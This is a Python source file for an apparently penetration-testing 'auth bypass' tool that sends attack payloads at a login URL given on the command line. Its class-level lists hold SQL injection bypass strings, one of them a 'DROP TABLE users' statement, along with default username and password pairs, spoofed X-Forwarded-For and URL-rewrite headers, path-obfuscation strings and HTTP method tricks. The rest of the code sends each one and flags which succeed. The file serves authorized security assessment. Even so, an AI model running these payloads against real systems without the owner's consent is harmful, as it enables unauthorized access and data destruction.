"""
Authentication Bypass Tester - Tests for common authentication bypass vulnerabilities
"""
import sys
import argparse
import requests
import urllib3
from pathlib import Path
from typing import List, Dict, Any, Optional
from dataclasses import dataclass

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from utils.base_wrapper import AuthTool
from utils.output_parser import Finding, Severity

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


@dataclass
class BypassResult:
    """Result of a bypass attempt"""
    technique: str
    payload: str
    success: bool
    status_code: int
    response_length: int
    redirect_url: str = ""
    evidence: str = ""


class AuthBypassTester(AuthTool):
    """Tester for authentication bypass vulnerabilities"""

    # SQL Injection bypass payloads
    SQL_BYPASS_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "admin'#",
        "' OR 1=1--",
        "' OR 1=1#",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        "admin') OR ('1'='1'--",
        "' OR ''='",
        "1' OR '1'='1",
        "' OR 'x'='x",
        "' OR 1=1 LIMIT 1--",
        "admin' OR '1'='1",
        "' UNION SELECT 1,1,1--",
        "' AND 1=0 UNION SELECT 'admin','admin'--",
        "'; DROP TABLE users--",
        "1; SELECT * FROM users",
        "' OR username LIKE '%admin%'--",
    ]

    # Default credentials to test
    DEFAULT_CREDENTIALS = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "123456"),
        ("admin", "admin123"),
        ("administrator", "administrator"),
        ("administrator", "password"),
        ("root", "root"),
        ("root", "toor"),
        ("root", "password"),
        ("test", "test"),
        ("guest", "guest"),
        ("user", "user"),
        ("user", "password"),
        ("demo", "demo"),
        ("admin", ""),
        ("", ""),
        ("admin", "Password1"),
        ("admin", "admin@123"),
        ("sa", "sa"),
        ("postgres", "postgres"),
    ]

    # Header-based bypass techniques
    HEADER_BYPASS_PAYLOADS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "localhost"},
        {"X-Forwarded-For": "10.0.0.1"},
        {"X-Forwarded-For": "192.168.1.1"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Host": "localhost"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
        {"Cluster-Client-IP": "127.0.0.1"},
        {"X-ProxyUser-Ip": "127.0.0.1"},
        {"CF-Connecting-IP": "127.0.0.1"},
        {"Fastly-Client-Ip": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
    ]

    # Path-based bypass techniques
    PATH_BYPASS_PAYLOADS = [
        "/admin",
        "/admin/",
        "/admin/.",
        "//admin",
        "/./admin",
        "/admin%20",
        "/admin%09",
        "/admin%00",
        "/admin..;/",
        "/admin;/",
        "/admin.json",
        "/admin.html",
        "/ADMIN",
        "/Admin",
        "/aDmIn",
        "/%61dmin",  # URL encoded 'a'
        "/admin#",
        "/admin?",
        "/admin?.css",
        "/admin?.js",
        "/admin/~",
        "/.;/admin",
        "//;/admin",
        "/admin..;/..;/",
    ]

    # HTTP Method bypass
    METHOD_BYPASS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE", "CONNECT"]

    @property
    def tool_name(self) -> str:
        return "auth_bypass"

    def check_tool_installed(self) -> bool:
        """This is a pure Python tool, just check for requests"""
        try:
            import requests
            return True
        except ImportError:
            return False

    def _build_target_args(self, target: str, **kwargs) -> list:
        """Not used for pure Python tool"""
        return []

    def run(self, target: str, output_file: str = None, **kwargs) -> Dict[str, Any]:
        """Execute authentication bypass tests"""
        from datetime import datetime

        self.start_time = datetime.now()
        results = []
        findings = []

        print(f"[*] Starting authentication bypass tests on {target}")

        # Get test configuration
        username_field = kwargs.get("username_field", "username")
        password_field = kwargs.get("password_field", "password")
        test_types = kwargs.get("test_types", ["sql", "default", "header", "path", "method"])
        headers = kwargs.get("headers", {})
        cookies = kwargs.get("cookies", {})
        timeout = kwargs.get("timeout", 10)
        verify_ssl = kwargs.get("verify_ssl", False)

        # SQL Injection bypass
        if "sql" in test_types:
            print("[*] Testing SQL injection authentication bypass...")
            sql_results = self._test_sql_bypass(
                target, username_field, password_field,
                headers, cookies, timeout, verify_ssl
            )
            results.extend(sql_results)

            for r in sql_results:
                if r.success:
                    findings.append(Finding(
                        tool="auth_bypass",
                        target=target,
                        finding_type="auth_bypass",
                        title="SQL Injection Authentication Bypass",
                        description=f"Authentication bypass via SQL injection: {r.payload}",
                        severity=Severity.CRITICAL,
                        payload=r.payload,
                        evidence=r.evidence,
                        remediation="Use parameterized queries and prepared statements"
                    ))

        # Default credentials
        if "default" in test_types:
            print("[*] Testing default credentials...")
            cred_results = self._test_default_credentials(
                target, username_field, password_field,
                headers, cookies, timeout, verify_ssl
            )
            results.extend(cred_results)

            for r in cred_results:
                if r.success:
                    findings.append(Finding(
                        tool="auth_bypass",
                        target=target,
                        finding_type="auth_bypass",
                        title="Default Credentials Found",
                        description=f"Login successful with default credentials: {r.payload}",
                        severity=Severity.HIGH,
                        payload=r.payload,
                        evidence=r.evidence,
                        remediation="Change default credentials and enforce strong password policy"
                    ))

        # Header-based bypass
        if "header" in test_types:
            print("[*] Testing header-based authentication bypass...")
            protected_url = kwargs.get("protected_url", target)
            header_results = self._test_header_bypass(
                protected_url, headers, cookies, timeout, verify_ssl
            )
            results.extend(header_results)

            for r in header_results:
                if r.success:
                    findings.append(Finding(
                        tool="auth_bypass",
                        target=target,
                        finding_type="auth_bypass",
                        title="Header-based Authentication Bypass",
                        description=f"Authentication bypass via header manipulation: {r.technique}",
                        severity=Severity.HIGH,
                        payload=str(r.payload),
                        evidence=r.evidence,
                        remediation="Validate authentication server-side, don't trust client headers"
                    ))

        # Path-based bypass
        if "path" in test_types:
            print("[*] Testing path-based authentication bypass...")
            base_url = kwargs.get("base_url", target.rsplit('/', 1)[0])
            path_results = self._test_path_bypass(
                base_url, headers, cookies, timeout, verify_ssl
            )
            results.extend(path_results)

            for r in path_results:
                if r.success:
                    findings.append(Finding(
                        tool="auth_bypass",
                        target=target,
                        finding_type="auth_bypass",
                        title="Path-based Authentication Bypass",
                        description=f"Authentication bypass via path manipulation: {r.payload}",
                        severity=Severity.HIGH,
                        payload=r.payload,
                        evidence=r.evidence,
                        remediation="Normalize URLs before authorization checks"
                    ))

        # HTTP Method bypass
        if "method" in test_types:
            print("[*] Testing HTTP method-based authentication bypass...")
            protected_url = kwargs.get("protected_url", target)
            method_results = self._test_method_bypass(
                protected_url, headers, cookies, timeout, verify_ssl
            )
            results.extend(method_results)

            for r in method_results:
                if r.success:
                    findings.append(Finding(
                        tool="auth_bypass",
                        target=target,
                        finding_type="auth_bypass",
                        title="HTTP Method Authentication Bypass",
                        description=f"Authentication bypass via HTTP method: {r.technique}",
                        severity=Severity.MEDIUM,
                        payload=r.technique,
                        evidence=r.evidence,
                        remediation="Enforce authentication for all HTTP methods"
                    ))

        self.end_time = datetime.now()
        duration = (self.end_time - self.start_time).total_seconds()

        # Save results
        if output_file:
            self._save_results(output_file, results, findings)

        return {
            "success": True,
            "tool": self.tool_name,
            "target": target,
            "duration": duration,
            "results": findings,
            "raw_results": [vars(r) for r in results],
            "summary": {
                "total_tests": len(results),
                "successful_bypasses": len([r for r in results if r.success]),
                "findings_count": len(findings)
            }
        }

    def _test_sql_bypass(self, url: str, username_field: str, password_field: str,
                         headers: dict, cookies: dict, timeout: int, verify_ssl: bool) -> List[BypassResult]:
        """Test SQL injection authentication bypass"""
        results = []

        for payload in self.SQL_BYPASS_PAYLOADS:
            try:
                data = {
                    username_field: payload,
                    password_field: "anything"
                }

                response = requests.post(
                    url, data=data, headers=headers, cookies=cookies,
                    timeout=timeout, verify=verify_ssl, allow_redirects=False
                )

                success = self._detect_successful_login(response)

                results.append(BypassResult(
                    technique="sql_injection",
                    payload=payload,
                    success=success,
                    status_code=response.status_code,
                    response_length=len(response.text),
                    redirect_url=response.headers.get('Location', ''),
                    evidence=response.text[:500] if success else ""
                ))

            except Exception as e:
                results.append(BypassResult(
                    technique="sql_injection",
                    payload=payload,
                    success=False,
                    status_code=0,
                    response_length=0,
                    evidence=str(e)
                ))

        return results

    def _test_default_credentials(self, url: str, username_field: str, password_field: str,
                                   headers: dict, cookies: dict, timeout: int, verify_ssl: bool) -> List[BypassResult]:
        """Test default credentials"""
        results = []

        for username, password in self.DEFAULT_CREDENTIALS:
            try:
                data = {
                    username_field: username,
                    password_field: password
                }

                response = requests.post(
                    url, data=data, headers=headers, cookies=cookies,
                    timeout=timeout, verify=verify_ssl, allow_redirects=False
                )

                success = self._detect_successful_login(response)

                results.append(BypassResult(
                    technique="default_credentials",
                    payload=f"{username}:{password}",
                    success=success,
                    status_code=response.status_code,
                    response_length=len(response.text),
                    redirect_url=response.headers.get('Location', ''),
                    evidence=f"Login successful with {username}:{password}" if success else ""
                ))

            except Exception as e:
                results.append(BypassResult(
                    technique="default_credentials",
                    payload=f"{username}:{password}",
                    success=False,
                    status_code=0,
                    response_length=0,
                    evidence=str(e)
                ))

        return results

    def _test_header_bypass(self, url: str, base_headers: dict, cookies: dict,
                            timeout: int, verify_ssl: bool) -> List[BypassResult]:
        """Test header-based authentication bypass"""
        results = []

        # Get baseline response
        try:
            baseline = requests.get(url, headers=base_headers, cookies=cookies,
                                   timeout=timeout, verify=verify_ssl)
            baseline_length = len(baseline.text)
            baseline_status = baseline.status_code
        except:
            baseline_length = 0
            baseline_status = 0

        for bypass_headers in self.HEADER_BYPASS_PAYLOADS:
            try:
                test_headers = {**base_headers, **bypass_headers}

                response = requests.get(
                    url, headers=test_headers, cookies=cookies,
                    timeout=timeout, verify=verify_ssl
                )

                # Detect potential bypass
                success = (
                    (baseline_status in [401, 403] and response.status_code == 200) or
                    (response.status_code == 200 and abs(len(response.text) - baseline_length) > 100)
                )

                results.append(BypassResult(
                    technique="header_bypass",
                    payload=str(bypass_headers),
                    success=success,
                    status_code=response.status_code,
                    response_length=len(response.text),
                    evidence=response.text[:500] if success else ""
                ))

            except Exception as e:
                results.append(BypassResult(
                    technique="header_bypass",
                    payload=str(bypass_headers),
                    success=False,
                    status_code=0,
                    response_length=0,
                    evidence=str(e)
                ))

        return results

    def _test_path_bypass(self, base_url: str, headers: dict, cookies: dict,
                          timeout: int, verify_ssl: bool) -> List[BypassResult]:
        """Test path-based authentication bypass"""
        results = []

        for path in self.PATH_BYPASS_PAYLOADS:
            try:
                test_url = f"{base_url.rstrip('/')}{path}"

                response = requests.get(
                    test_url, headers=headers, cookies=cookies,
                    timeout=timeout, verify=verify_ssl, allow_redirects=False
                )

                # Detect potential bypass (200 on admin paths)
                success = response.status_code == 200 and 'admin' in path.lower()

                results.append(BypassResult(
                    technique="path_bypass",
                    payload=path,
                    success=success,
                    status_code=response.status_code,
                    response_length=len(response.text),
                    redirect_url=response.headers.get('Location', ''),
                    evidence=response.text[:500] if success else ""
                ))

            except Exception as e:
                results.append(BypassResult(
                    technique="path_bypass",
                    payload=path,
                    success=False,
                    status_code=0,
                    response_length=0,
                    evidence=str(e)
                ))

        return results

    def _test_method_bypass(self, url: str, headers: dict, cookies: dict,
                            timeout: int, verify_ssl: bool) -> List[BypassResult]:
        """Test HTTP method-based authentication bypass"""
        results = []

        # Get baseline with GET
        try:
            baseline = requests.get(url, headers=headers, cookies=cookies,
                                   timeout=timeout, verify=verify_ssl)
            baseline_status = baseline.status_code
        except:
            baseline_status = 0

        for method in self.METHOD_BYPASS:
            try:
                response = requests.request(
                    method, url, headers=headers, cookies=cookies,
                    timeout=timeout, verify=verify_ssl
                )

                # Detect bypass (different successful response than baseline)
                success = (
                    baseline_status in [401, 403, 405] and
                    response.status_code == 200
                )

                results.append(BypassResult(
                    technique=f"method_{method}",
                    payload=method,
                    success=success,
                    status_code=response.status_code,
                    response_length=len(response.text),
                    evidence=response.text[:500] if success else ""
                ))

            except Exception as e:
                results.append(BypassResult(
                    technique=f"method_{method}",
                    payload=method,
                    success=False,
                    status_code=0,
                    response_length=0,
                    evidence=str(e)
                ))

        return results

    def _detect_successful_login(self, response: requests.Response) -> bool:
        """Detect if login was successful based on response"""
        # Check for redirect to dashboard/home
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get('Location', '').lower()
            if any(kw in location for kw in ['dashboard', 'home', 'admin', 'welcome', 'profile', 'account']):
                return True

        # Check response body for success indicators
        body_lower = response.text.lower()
        success_indicators = [
            'welcome', 'dashboard', 'logout', 'sign out', 'signout',
            'my account', 'profile', 'successfully logged', 'login successful'
        ]
        failure_indicators = [
            'invalid', 'incorrect', 'failed', 'error', 'wrong password',
            'authentication failed', 'access denied', 'try again'
        ]

        has_success = any(ind in body_lower for ind in success_indicators)
        has_failure = any(ind in body_lower for ind in failure_indicators)

        if has_success and not has_failure:
            return True

        # Check for session cookie being set
        if 'set-cookie' in response.headers:
            cookie_header = response.headers['set-cookie'].lower()
            if any(kw in cookie_header for kw in ['session', 'auth', 'token', 'jwt']):
                return True

        return False

    def _save_results(self, output_file: str, results: List[BypassResult], findings: List[Finding]):
        """Save results to file"""
        import json

        output = {
            "findings": [f.to_dict() for f in findings],
            "raw_results": [vars(r) for r in results],
            "summary": {
                "total_tests": len(results),
                "successful_bypasses": len([r for r in results if r.success])
            }
        }

        with open(output_file, 'w') as f:
            json.dump(output, f, indent=2)

        print(f"[+] Results saved to: {output_file}")


def main():
    parser = argparse.ArgumentParser(
        description="Authentication Bypass Tester",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python auth_bypass.py -u https://example.com/login
  python auth_bypass.py -u https://example.com/login --username-field user --password-field pass
  python auth_bypass.py -u https://example.com/login --test-types sql,default
  python auth_bypass.py -u https://example.com/login --protected-url https://example.com/admin
        """
    )

    parser.add_argument("-u", "--url", required=True, help="Login URL to test")
    parser.add_argument("--username-field", default="username", help="Username field name")
    parser.add_argument("--password-field", default="password", help="Password field name")
    parser.add_argument("--test-types", default="sql,default,header,path,method",
                        help="Test types (comma-separated): sql,default,header,path,method")
    parser.add_argument("--protected-url", help="Protected URL for header/method bypass tests")
    parser.add_argument("--base-url", help="Base URL for path bypass tests")
    parser.add_argument("-H", "--header", action="append", dest="headers",
                        help="Custom header (format: 'Name: Value')")
    parser.add_argument("-c", "--cookie", help="Cookies")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--verify-ssl", action="store_true", help="Verify SSL certificates")

    args = parser.parse_args()

    # Parse headers
    headers = {}
    if args.headers:
        for h in args.headers:
            if ':' in h:
                name, value = h.split(':', 1)
                headers[name.strip()] = value.strip()

    # Parse cookies
    cookies = {}
    if args.cookie:
        for c in args.cookie.split(';'):
            if '=' in c:
                name, value = c.split('=', 1)
                cookies[name.strip()] = value.strip()

    tester = AuthBypassTester()

    result = tester.run(
        target=args.url,
        output_file=args.output,
        username_field=args.username_field,
        password_field=args.password_field,
        test_types=args.test_types.split(','),
        protected_url=args.protected_url,
        base_url=args.base_url,
        headers=headers,
        cookies=cookies,
        timeout=args.timeout,
        verify_ssl=args.verify_ssl
    )

    # Print summary
    print(f"\n{'='*60}")
    print("AUTHENTICATION BYPASS TEST RESULTS")
    print(f"{'='*60}")
    print(f"Target: {args.url}")
    print(f"Total Tests: {result['summary']['total_tests']}")
    print(f"Successful Bypasses: {result['summary']['successful_bypasses']}")
    print(f"Duration: {result['duration']:.2f}s")

    if result['results']:
        print(f"\n[!] VULNERABILITIES FOUND!")
        for finding in result['results']:
            print(f"\n  [{finding.severity.value.upper()}] {finding.title}")
            print(f"  Description: {finding.description}")
            print(f"  Payload: {finding.payload}")
            print(f"  Remediation: {finding.remediation}")
    else:
        print("\n[+] No authentication bypass vulnerabilities found")

    return 0 if result["success"] else 1


if __name__ == "__main__":
    sys.exit(main())
